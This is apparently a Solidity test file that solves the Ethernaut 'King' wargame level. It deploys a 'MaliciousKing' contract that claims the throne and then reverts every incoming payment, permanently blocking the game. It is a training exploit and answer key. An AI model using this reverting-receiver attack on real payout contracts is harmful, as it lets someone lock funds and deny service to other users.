// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/King.sol";
import "src/levels/KingFactory.sol";

contract TestKing is BaseTest {
    King private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new KingFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = King(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level._king(), address(levelFactory));
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);

        // Solve the Challenge
        MaliciousKing maliciousKing = new MaliciousKing{value: level.prize()}(levelAddress);
        maliciousKing.becomeKing();

        vm.stopPrank();
    }
}

contract MaliciousKing {
    King private level;

    constructor(address _target) public payable {
        level = King(payable(_target));
    }

    function becomeKing() public {
        address(level).call{value: level.prize()}("");
    }

    receive() external payable {
        revert("Now the game is over");
    }
}